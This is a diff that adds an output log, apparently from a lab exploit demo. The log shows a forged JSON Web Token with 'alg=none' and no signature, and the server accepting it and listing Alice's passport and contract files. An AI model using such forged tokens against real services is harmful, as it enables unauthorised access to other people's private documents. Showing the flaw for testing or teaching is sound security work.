@@ -1,0 +1,17 @@
+[*] Forged token (alg=none): eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFsaWNlX2ZvcmdlIiwgInJvbGUiOiAidXNlciJ9.
+[*] Using forged token to access Alice's docs
+[*] Status: 200
+[*] Response: {
+  "docs": [
+    "alice_passport.pdf",
+    "alice_contract.pdf"
+  ],
+  "requested_user_id": 1,
+  "token_payload": {
+    "role": "user",
+    "user_id": 1,
+    "username": "alice_forge"
+  },
+  "username": "alice"
+}
+
